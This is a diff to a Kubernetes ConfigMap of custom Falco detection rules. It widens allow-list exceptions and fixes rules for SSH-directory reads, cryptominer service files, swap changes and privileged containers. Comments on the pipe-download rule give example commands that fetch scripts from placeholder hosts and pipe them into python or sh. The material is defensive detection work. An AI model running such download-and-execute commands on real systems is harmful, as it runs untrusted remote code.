@@ -1024,7 +1024,7 @@ data:
     \ enabled: true\n  output: Container escape behavior based binfmt_misc [custom]
     (command=%proc.cmdline connection=%fd.name IP=%fd.sip.name pid=%proc.pid user=%user.name
     user_loginuid=%user.loginuid container_id=%container.id image=%container.image.repository)\n
-    \ priority: CRITICAL\n  tags: host, container, process, mitre_privilege_escalation]\n\n\n\n##
+    \ priority: CRITICAL\n  tags: [host, container, process, mitre_privilege_escalation]\n\n\n\n##
     EXPERIMENTAL RULE 21 - Container escape behavior based mknod [custom]\n## [In Incubation]\n##
     mknod (change focus to CVE)\n\n\n\n## EXPERIMENTAL RULE 22 - container escape based
     nsenter maybe buffer overflow [CVE-2017-7308]\n## [In Incubation]\n## Applies for
@@ -1180,39 +1180,38 @@ data:
     IP=%fd.sip.name pid=%proc.pid user=%user.name user_loginuid=%user.loginuid container_id=%container.id
     image=%container.image.repository)\n  priority: INFO\n  tags: [mitre_defense_evasion,
     host, container, process]\n\n\n\n## RULE 34: Memory Swap Modification [custom]\n\n##
-    memory swap modification (swapoff) sudo swapoff -a \n## https://www.elastic.co/guide/en/security/current/memory-swap-modification.html\n##
-    XMRig \n## sysctl vm.swappiness\n## /etc/fstab  word(swap)\n\n- rule: Memory Swap
-    Modification inside a container [custom]\n  desc: Detects memory swap modifications,
-    which may indicate attempts to alter system memory behavior. Such actions are often
-    associated with performance impacts or malicious activities like cryptocurrency
-    mining.\n  condition: spawned_process and (proc.cmdline in (\"swapon\", \"swapoff\"))
-    and container\n  enabled: true\n  output: \"Memory Swap Modification (user=%user.name
-    user_loginuid=%user.loginuid\n    command=%proc.cmdline container_id=%container.id
-    container_name=%container.name image=%container.image.repository:%container.image.tag
-    proc=%proc.name pid=%proc.pid)\"\n  priority: WARNING\n  tags: [mitre_execution,
-    container, host, process]\n\n\n\n## RULE 35: Command Chaining patterns via Pipe
-    [custom]\n\n# Pipe Download and Execute\n# Only pull scripts from trusted repositories.\n#
-    curl -sL http://x.x.x.x:y/sitio/vuelta.txt | python3.9\n# curl -o- http://malicious-script
-    | sh\n\n- macro: curl_suspicious_redirection\n  condition: proc.name=curl and\n
-    \             (proc.cmdline contains \"| python\")\n              \n\n- rule: Command
-    Chaining patterns via Pipe [custom]\n  desc: Detects the use of curl commands with
-    pipes (|) that redirect output to executables like python, which may download and
-    execute potentially malicious scripts. This rule helps identify unsafe script execution
-    from untrusted sources.\n  condition: >\n    curl_suspicious_redirection\n  enabled:
-    true\n  output: Command Chaining patterns via Pipe [custom] (command=%proc.cmdline
-    connection=%fd.name IP=%fd.sip.name pid=%proc.pid user=%user.name user_loginuid=%user.loginuid
-    container_id=%container.id image=%container.image.repository)\n  priority: INFO\n
-    \ tags: [mitre_resource_development, host, container, process]\n\n# initial_access:
-    It could also be that\n\n\n\n## RULE 36: Suspicious Mining Process Creation Event\n\n-
-    rule: Suspicious Mining Process Creation Event [custom]\n  desc: Detects the creation
-    of suspicious service files associated with known cryptomining operations, such
-    as aliyun.service or moneroocean_miner.service. This rule helps identify potential
-    system infections by cryptominers.\n  condition: open_read and (fd.name contains
-    \"aliyun.service\" or fd.name contains \"moneroocean_miner.service\" or fd.name
-    contains \"c3pool_miner.service\" or\n   fd.name contains \"pnsd.service\" or fd.name
-    contains \"apache4.service\" or fd.name contains \"pastebin.service\" or fd.name
-    contains \"xvf.service\")\n  enabled: true\n  output: Suspicious Mining Process
-    Creation Event (| file=%fd.name | proc.pname=%proc.pname gparent=%proc.aname[2]
+    memory swap modification (swapoff) sudo swapoff -a \n## XMRig \n## sysctl vm.swappiness\n##
+    /etc/fstab  word(swap)\n\n- rule: Memory Swap Modification inside a container [custom]\n
+    \ desc: Detects memory swap modifications, which may indicate attempts to alter
+    system memory behavior. Such actions are often associated with performance impacts
+    or malicious activities like cryptocurrency mining.\n  condition: spawned_process
+    and (proc.cmdline in (\"swapon\", \"swapoff\")) and container\n  enabled: true\n
+    \ output: \"Memory Swap Modification (user=%user.name user_loginuid=%user.loginuid\n
+    \   command=%proc.cmdline container_id=%container.id container_name=%container.name
+    image=%container.image.repository:%container.image.tag proc=%proc.name pid=%proc.pid)\"\n
+    \ priority: WARNING\n  tags: [mitre_execution, container, host, process]\n\n\n\n##
+    RULE 35: Command Chaining patterns via Pipe [custom]\n\n# Pipe Download and Execute\n#
+    Only pull scripts from trusted repositories.\n# curl -sL http://x.x.x.x:y/sitio/vuelta.txt
+    | python3.9\n# curl -o- http://malicious-script | sh\n\n- macro: curl_suspicious_redirection\n
+    \ condition: proc.name=curl and\n              (proc.cmdline contains \"| python\")\n
+    \             \n\n- rule: Command Chaining patterns via Pipe [custom]\n  desc: Detects
+    the use of curl commands with pipes (|) that redirect output to executables like
+    python, which may download and execute potentially malicious scripts. This rule
+    helps identify unsafe script execution from untrusted sources.\n  condition: >\n
+    \   curl_suspicious_redirection\n  enabled: true\n  output: Command Chaining patterns
+    via Pipe [custom] (command=%proc.cmdline connection=%fd.name IP=%fd.sip.name pid=%proc.pid
+    user=%user.name user_loginuid=%user.loginuid container_id=%container.id image=%container.image.repository)\n
+    \ priority: INFO\n  tags: [mitre_resource_development, host, container, process]\n\n#
+    initial_access: It could also be that\n\n\n\n## RULE 36: Suspicious Mining Process
+    Creation Event\n\n- rule: Suspicious Mining Process Creation Event [custom]\n  desc:
+    Detects the creation of suspicious service files associated with known cryptomining
+    operations, such as aliyun.service or moneroocean_miner.service. This rule helps
+    identify potential system infections by cryptominers.\n  condition: open_read and
+    (fd.name contains \"aliyun.service\" or fd.name contains \"moneroocean_miner.service\"
+    or fd.name contains \"c3pool_miner.service\" or\n   fd.name contains \"pnsd.service\"
+    or fd.name contains \"apache4.service\" or fd.name contains \"pastebin.service\"
+    or fd.name contains \"xvf.service\")\n  enabled: true\n  output: Suspicious Mining
+    Process Creation Event (| file=%fd.name | proc.pname=%proc.pname gparent=%proc.aname[2]
     ggparent=%proc.aname[3] gggparent=%proc.aname[4] image=%container.image.repository
     | proc.cmdline=%proc.cmdline | container.name=%container.name | proc.cwd=%proc.cwd
     proc.pcmdline=%proc.pcmdline user.name=%user.name user.loginuid=%user.loginuid user.uid=%user.uid
@@ -1809,17 +1808,18 @@ data:
     \ condition: (never_true)\n\n# Disk size inspection du -hd1 and systemd process\n-
     macro: meli_read_ssh_information_cmdtuning\n  condition: (proc.cmdline startswith
     \"analyzer\" or proc.cmdline=\"du -hd1\" or proc.cmdline=mbdaemon or proc.cmdline
-    startswith \"du -\" or proc.cmdline startswith \"agent_thread.r\")\n\n# Gitlab pipeline
-    submodules and commits management\n- macro: meli_read_ssh_information_proctuning\n
-    \ condition: (proc.pname=ci-submodules-r or proc.pname=update-hash-com)\n\n# Baseline
-    rules\n# Tuning: whitelist proc.cmdline using meli_read_ssh_information_cmdtuning\n#
-    Tuning: whitelist MELI images using allowed_meli_images list\n- rule: Read ssh information\n
-    \ desc: Any attempt to read files below ssh directories by non-ssh programs\n  condition:
-    >\n    ((open_read or open_directory) and\n     (user_ssh_directory or fd.name startswith
-    /root/.ssh) and\n     not user_known_read_ssh_information_activities and\n     not
-    proc.name in (ssh_binaries))\n     and not meli_read_ssh_information_cmdtuning\n
-    \    and not meli_read_ssh_information_proctuning\n     and not container.image.repository
-    in (allowed_meli_images)\n  enabled: true\n  output: >\n    ssh-related file/directory
+    startswith \"du -\" or proc.cmdline startswith \"agent_thread.r\" or proc.cmdline
+    startswith io-worker)\n\n# Gitlab pipeline submodules and commits management\n-
+    macro: meli_read_ssh_information_proctuning\n  condition: (proc.pname=ci-submodules-r
+    or proc.pname=update-hash-com)\n\n# Baseline rules\n# Tuning: whitelist proc.cmdline
+    using meli_read_ssh_information_cmdtuning\n# Tuning: whitelist MELI images using
+    allowed_meli_images list\n- rule: Read ssh information\n  desc: Any attempt to read
+    files below ssh directories by non-ssh programs\n  condition: >\n    ((open_read
+    or open_directory) and\n     (user_ssh_directory or fd.name startswith /root/.ssh)
+    and\n     not user_known_read_ssh_information_activities and\n     not proc.name
+    in (ssh_binaries))\n     and not meli_read_ssh_information_cmdtuning\n     and not
+    meli_read_ssh_information_proctuning\n     and not container.image.repository in
+    (allowed_meli_images)\n  enabled: true\n  output: >\n    ssh-related file/directory
     read by non-ssh program (user=%user.name user_loginuid=%user.loginuid\n    command=%proc.cmdline
     pid=%proc.pid file=%fd.name parent=%proc.pname pcmdline=%proc.pcmdline container_id=%container.id
     image=%container.image.repository Custom_Tags=IRT_Alert)\n  priority: ERROR\n  tags:
@@ -2103,19 +2103,22 @@ data:
     macro: run_by_appdynamics\n  condition: (proc.pname=java and proc.pcmdline startswith
     \"java -jar -Dappdynamics\")\n\n# postgres f+ and sh -c test ! -f /var/lib/postgresql/gradle-enterprise%
     in ELSA\n- macro: meli_DB_program_spawned_process_cmdtuning\n  condition: >\n    (proc.cmdline=\"sh
-    -c locale -a\")\n\n- macro: user_known_db_spawned_processes\n  condition: (never_true)\n\n-
-    rule: DB program spawned process\n  desc: >\n    a database-server related program
-    spawned a new process other than itself.\n    This shouldn\\'t occur and is a follow
-    on from some SQL injection attacks.\n  condition: >\n    proc.pname in (db_server_binaries)\n
-    \   and spawned_process\n    and not proc.name in (db_server_binaries)\n    and
-    not postgres_running_wal_e\n    and not user_known_db_spawned_processes\n    and
-    not meli_DB_program_spawned_process_cmdtuning\n  enabled: true\n  output: >\n    Database-related
-    program spawned process other than itself (user=%user.name user_loginuid=%user.loginuid\n
-    \   program=%proc.cmdline pid=%proc.pid parent=%proc.pname container_id=%container.id
-    image=%container.image.repository Custom_Tags=IRT_Alert)\n  priority: NOTICE\n  tags:
-    [process, database, mitre_execution, IRT_Alert]\n\n- macro: user_known_modify_bin_dir_activities\n
-    \ condition: (never_true)\n\n- macro: meli_modify_binary_dirs_cmdtuning\n  condition:
-    (proc.cmdline startswith \"dockerd\"  or proc.cmdline startswith \"<NA>\" or\n               proc.cmdline
+    -c locale -a\"  or proc.cmdline contains gradle-enterprise or proc.cmdline contains
+    grpc-health-pro or proc.cmdline startswith \"git index-pack\" or proc.cmdline startswith
+    \"tetra status\" or\n    proc.cmdline contains containerd)\n\n- macro: user_known_db_spawned_processes\n
+    \ condition: (never_true)\n\n- rule: DB program spawned process\n  desc: >\n    a
+    database-server related program spawned a new process other than itself.\n    This
+    shouldn\\'t occur and is a follow on from some SQL injection attacks.\n  condition:
+    >\n    proc.pname in (db_server_binaries)\n    and spawned_process\n    and not
+    proc.name in (db_server_binaries)\n    and not postgres_running_wal_e\n    and not
+    user_known_db_spawned_processes\n    and not meli_DB_program_spawned_process_cmdtuning\n
+    \ enabled: true\n  output: >\n    Database-related program spawned process other
+    than itself (user=%user.name user_loginuid=%user.loginuid\n    program=%proc.cmdline
+    pid=%proc.pid parent=%proc.pname container_id=%container.id image=%container.image.repository
+    Custom_Tags=IRT_Alert)\n  priority: NOTICE\n  tags: [process, database, mitre_execution,
+    IRT_Alert]\n\n- macro: user_known_modify_bin_dir_activities\n  condition: (never_true)\n\n-
+    macro: meli_modify_binary_dirs_cmdtuning\n  condition: (proc.cmdline startswith
+    \"dockerd\"  or proc.cmdline startswith \"<NA>\" or\n               proc.cmdline
     startswith \"rm -f /usr/sbin/install-mime\" or proc.cmdline startswith \"bsdmainutils.po\"
     or\n               proc.cmdline startswith \"rm -f /usr/sbin/ip\" or proc.cmdline
     contains \"ip6tables\" or proc.cmdline contains \"iptables\" or\n               proc.cmdline
@@ -2382,27 +2385,28 @@ data:
     startswith \"gce-pd-csi-driv\" or proc.cmdline startswith \"netd\" or proc.cmdline
     startswith \"cilium-agent\" or\n               proc.cmdline startswith \"init-container\"
     or proc.cmdline startswith \"init-container\" or proc.cmdline startswith install
-    or\n               proc.cmdline startswith aws-vpc-cni or proc.cmdline contains
-    cilium or proc.cmdline startswith proxy-init or\n               proc.cmdline startswith
-    csi-driver or proc.cmdline startswith falco or proc.cmdline startswith node-driver-reg
-    or\n               proc.cmdline startswith aws-efs-csi-dri or proc.cmdline startswith
-    gke-metadata-se or proc.cmdline startswith runc or\n               proc.cmdline
-    startswith gcs-fuse-csi-dr)\n\n- rule: Launch Excessively Capable Container\n  desc:
-    Detect container started with a powerful set of capabilities. Exceptions are made
-    for known trusted images.\n  condition: >\n    container_started and container\n
-    \   and excessively_capable_container\n    and not falco_privileged_containers\n
-    \   and not user_privileged_containers\n    and not meli_launch_excessively_capable_cntnr_cmdtuning\n
-    \ enabled: true\n  output: Excessively capable container started (user=%user.name
-    user_loginuid=%user.loginuid command=%proc.cmdline pid=%proc.pid %container.info
-    image=%container.image.repository:%container.image.tag cap_permitted=%thread.cap_permitted)\n
-    \ priority: INFO\n  tags: [container, cis, mitre_privilege_escalation, mitre_lateral_movement]\n\n\n#
-    For now, only considering a full mount of /etc as\n# sensitive. Ideally, this would
-    also consider all subdirectories\n# below /etc as well, but the globbing mechanism\n#
-    doesn't allow exclusions of a full pattern, only single characters.\n- macro: sensitive_mount\n
-    \ condition: (container.mount.dest[/proc*] != \"N/A\" or\n              container.mount.dest[/var/run/docker.sock]
-    != \"N/A\" or\n              container.mount.dest[/var/run/crio/crio.sock] != \"N/A\"
-    or\n              container.mount.dest[/run/containerd/containerd.sock] != \"N/A\"
-    or\n              container.mount.dest[/var/lib/kubelet] != \"N/A\" or\n              container.mount.dest[/var/lib/kubelet/pki]
+    or\n               proc.cmdline=aws-vpc-cni or proc.cmdline contains cilium or proc.cmdline
+    startswith proxy-init or\n               proc.cmdline startswith csi-driver or proc.cmdline
+    startswith falco or proc.cmdline startswith node-driver-reg or\n               proc.cmdline
+    startswith aws-efs-csi-dri or proc.cmdline startswith gke-metadata-se or proc.cmdline
+    startswith runc or\n               proc.cmdline startswith gcs-fuse-csi-dr or proc.cmdline
+    startswith runc:[1:CHILD] or proc.cmdline startswith cilium-envoy-st)\n\n- rule:
+    Launch Excessively Capable Container\n  desc: Detect container started with a powerful
+    set of capabilities. Exceptions are made for known trusted images.\n  condition:
+    >\n    container_started and container\n    and excessively_capable_container\n
+    \   and not falco_privileged_containers\n    and not user_privileged_containers\n
+    \   and not meli_launch_excessively_capable_cntnr_cmdtuning\n  enabled: true\n  output:
+    Excessively capable container started (user=%user.name user_loginuid=%user.loginuid
+    command=%proc.cmdline pid=%proc.pid %container.info image=%container.image.repository:%container.image.tag
+    cap_permitted=%thread.cap_permitted)\n  priority: INFO\n  tags: [container, cis,
+    mitre_privilege_escalation, mitre_lateral_movement]\n\n\n# For now, only considering
+    a full mount of /etc as\n# sensitive. Ideally, this would also consider all subdirectories\n#
+    below /etc as well, but the globbing mechanism\n# doesn't allow exclusions of a
+    full pattern, only single characters.\n- macro: sensitive_mount\n  condition: (container.mount.dest[/proc*]
+    != \"N/A\" or\n              container.mount.dest[/var/run/docker.sock] != \"N/A\"
+    or\n              container.mount.dest[/var/run/crio/crio.sock] != \"N/A\" or\n
+    \             container.mount.dest[/run/containerd/containerd.sock] != \"N/A\" or\n
+    \             container.mount.dest[/var/lib/kubelet] != \"N/A\" or\n              container.mount.dest[/var/lib/kubelet/pki]
     != \"N/A\" or\n              container.mount.dest[/] != \"N/A\" or\n              container.mount.dest[/home/admin]
     != \"N/A\" or\n              container.mount.dest[/etc] != \"N/A\" or\n              container.mount.dest[/etc/kubernetes]
     != \"N/A\" or\n              container.mount.dest[/etc/kubernetes/manifests] !=
@@ -3079,8 +3083,11 @@ data:
     startswith \"ansible-runner\" or\n   proc.cmdline contains \"fluentd\" or proc.cmdline
     startswith \"node --inspect\" or proc.cmdline = \"node ./index.js\" or proc.cmdline
     = \"node /app/index.js\" or\n   proc.cmdline = \"node ./.nordic/build/index.js\"
-    or proc.cmdline startswith \"node /app/node_modules/\")\n\n- macro: meli_redirect_stdout_stdin_ntwrk_cnnctn_container_img_rpstry_tuning\n
-    \ condition: (container.image.repository=\"registry.gitlab.com/gitlab-org/build/cng/gitlab-workhorse-ce\"
+    or proc.cmdline startswith \"node /app/node_modules/\" or proc.cmdline startswith
+    gke-metadata-se or\n   proc.cmdline startswith nginx-ingress-c or proc.cmdline startswith
+    xdg-settings or proc.cmdline startswith xdg-mime or proc.cmdline=\"go version\")\n\n-
+    macro: meli_redirect_stdout_stdin_ntwrk_cnnctn_container_img_rpstry_tuning\n  condition:
+    (container.image.repository=\"registry.gitlab.com/gitlab-org/build/cng/gitlab-workhorse-ce\"
     or container.image.repository=\"registry.gitlab.com/gitlab-org/build/cng/gitlab-shell\"
     or\n   container.image.repository contains \"gitlab\" or container.image.repository
     contains \"datadog-agent\" or container.image.repository contains \"datadog\")\n\n-
